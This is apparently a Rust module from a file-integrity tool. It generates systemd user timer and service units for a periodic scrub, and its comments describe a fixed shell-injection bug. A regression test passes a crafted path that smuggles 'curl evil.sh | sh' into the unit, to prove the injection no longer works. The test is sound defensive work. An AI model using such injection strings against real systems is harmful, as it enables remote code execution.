//! Scheduled scrub: a systemd user timer that periodically re-reads every
//! byte warden tracks and compares it against the catalog.
//!
//! The service runs `warden hash && warden verify --all`. The order is the
//! design: `hash` refreshes manifests first, so a file the user legitimately
//! changed (new mtime → new fingerprint) is re-hashed and passes; a file
//! whose bytes changed *without* its fingerprint changing — the bit-rot
//! signature — is exactly what `verify --all` then catches. Exit 1 on any
//! mismatch makes the unit's failure state the alert.
//!
//! Warden writes the two unit files (an explicit, user-invoked config
//! change) but does not enable them — starting services is the user's call,
//! and the command to run is printed.

use anyhow::{Context, Result};
use std::path::{Path, PathBuf};

pub const SERVICE_NAME: &str = "modelwarden-scrub.service";
pub const TIMER_NAME: &str = "modelwarden-scrub.timer";

/// systemd user-unit directory: `$XDG_CONFIG_HOME/systemd/user`.
pub fn unit_dir() -> PathBuf {
    std::env::var_os("XDG_CONFIG_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            std::env::home_dir()
                .unwrap_or_else(|| PathBuf::from("."))
                .join(".config")
        })
        .join("systemd/user")
}

/// One `ExecStart=` argument, quoted the way systemd parses it.
///
/// The unit used to be `/bin/sh -c '<path> hash && <path> verify --all'`
/// with the path interpolated raw into a single-quoted shell string. A
/// path holding an apostrophe broke the unit outright — anyone named
/// O'Brien — and a path an attacker could influence (a shared /tmp
/// build, a downloaded folder) ended a quote and ran whatever followed,
/// on a timer, as the user. There is no shell here any more; this only
/// has to survive systemd's own parser.
fn systemd_quote(path: &Path) -> String {
    let mut out = String::from("\"");
    for c in path.to_string_lossy().chars() {
        match c {
            '"' | '\\' => {
                out.push('\\');
                out.push(c);
            }
            '\n' => out.push_str("\\n"),
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

/// The two unit files, generated from the running binary's path so the
/// timer survives however warden was installed.
pub fn unit_files(warden_bin: &Path, calendar: &str) -> (String, String) {
    // Type=oneshot runs several ExecStart lines in order and stops at the
    // first failure, which is exactly what the old `&&` meant: verify
    // must not run against a catalog that failed to refresh.
    let bin = systemd_quote(warden_bin);
    let service = format!(
        "[Unit]\n\
         Description=modelwarden scrub: refresh catalog, re-verify every tracked byte\n\
         \n\
         [Service]\n\
         Type=oneshot\n\
         ExecStart={bin} hash\n\
         ExecStart={bin} verify --all\n\
         Nice=10\n\
         IOSchedulingClass=idle\n"
    );
    let timer = format!(
        "[Unit]\n\
         Description=Run the modelwarden scrub {calendar}\n\
         \n\
         [Timer]\n\
         OnCalendar={calendar}\n\
         Persistent=true\n\
         \n\
         [Install]\n\
         WantedBy=timers.target\n"
    );
    (service, timer)
}

/// Write both units. Returns the paths written and the enable command the
/// user still has to run themselves.
pub fn install(calendar: &str) -> Result<(Vec<PathBuf>, String)> {
    let bin = std::env::current_exe().context("resolving the warden binary path")?;
    let (service, timer) = unit_files(&bin, calendar);
    let dir = unit_dir();
    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
    let spath = dir.join(SERVICE_NAME);
    let tpath = dir.join(TIMER_NAME);
    std::fs::write(&spath, service).with_context(|| format!("writing {}", spath.display()))?;
    std::fs::write(&tpath, timer).with_context(|| format!("writing {}", tpath.display()))?;
    Ok((
        vec![spath, tpath],
        format!("systemctl --user enable --now {TIMER_NAME}"),
    ))
}

/// Where the scrub stands on this machine — the doctor advisory's input.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TimerState {
    /// No systemctl on PATH: not a systemd machine, nothing to advise.
    NoSystemd,
    NotInstalled,
    /// Units written but the timer isn't enabled — scrubs never run.
    Disabled,
    Enabled,
}

/// Probe the live state: unit file presence + `systemctl --user is-enabled`.
pub fn timer_state() -> TimerState {
    let probe = std::process::Command::new("systemctl")
        .args(["--user", "is-enabled", TIMER_NAME])
        .output();
    let Ok(out) = probe else {
        return TimerState::NoSystemd; // systemctl missing entirely
    };
    if String::from_utf8_lossy(&out.stdout).trim().starts_with("enabled") {
        return TimerState::Enabled;
    }
    if unit_dir().join(TIMER_NAME).is_file() {
        TimerState::Disabled
    } else {
        TimerState::NotInstalled
    }
}

/// The exact enable invocation, one place only — run by `scrub install
/// --enable` and by the doctor remedy.
pub fn enable_command() -> (String, Vec<String>) {
    (
        "systemctl".into(),
        vec!["--user".into(), "enable".into(), "--now".into(), TIMER_NAME.into()],
    )
}

/// Enable and start the timer. Only ever called on an explicit user
/// request (`--enable`, `doctor --fix`, the GUI button).
pub fn enable() -> Result<String> {
    let (program, args) = enable_command();
    let out = std::process::Command::new(&program)
        .args(&args)
        .output()
        .with_context(|| format!("running {program}"))?;
    if !out.status.success() {
        anyhow::bail!(
            "{program} failed ({}): {}",
            out.status,
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(format!("{TIMER_NAME} enabled and started"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn enable_command_targets_the_user_timer() {
        let (program, args) = enable_command();
        assert_eq!(program, "systemctl");
        assert_eq!(args, ["--user", "enable", "--now", TIMER_NAME]);
    }

    #[test]
    fn units_wire_the_binary_and_calendar_through() {
        let (service, timer) = unit_files(Path::new("/opt/warden"), "weekly");
        assert!(service.contains("ExecStart=\"/opt/warden\" hash\n"));
        assert!(service.contains("ExecStart=\"/opt/warden\" verify --all\n"));
        assert!(service.contains("Type=oneshot"));
        assert!(
            service.contains("IOSchedulingClass=idle"),
            "a scrub must never contend with real work for the disk"
        );
        assert!(timer.contains("OnCalendar=weekly"));
        assert!(timer.contains("Persistent=true"), "missed runs catch up");
        assert!(timer.contains("WantedBy=timers.target"));
    }

    #[test]
    fn no_shell_and_no_way_out_of_the_quotes() {
        // The generated unit ran through /bin/sh with the binary's own
        // path interpolated into a single-quoted string. An apostrophe
        // broke it; a crafted path escaped it and ran commands on a
        // timer, as the user.
        let hostile = Path::new("/home/o'brien/x'; curl evil.sh | sh; '/warden");
        let (service, _) = unit_files(hostile, "weekly");
        assert!(!service.contains("/bin/sh"), "no shell to inject into");
        assert!(!service.contains("curl evil.sh | sh\n"), "not a command of its own");
        // Exactly two ExecStart lines, each one quoted argument plus verbs.
        let execs: Vec<&str> = service
            .lines()
            .filter(|l| l.starts_with("ExecStart="))
            .collect();
        assert_eq!(execs.len(), 2);
        assert!(execs[0].ends_with("\" hash"));
        assert!(execs[1].ends_with("\" verify --all"));
        // Quotes and backslashes in the path are escaped, not terminating.
        let (svc, _) = unit_files(Path::new("/tmp/a\"b\\c/warden"), "weekly");
        assert!(svc.contains("ExecStart=\"/tmp/a\\\"b\\\\c/warden\" hash\n"), "{svc}");
    }
}
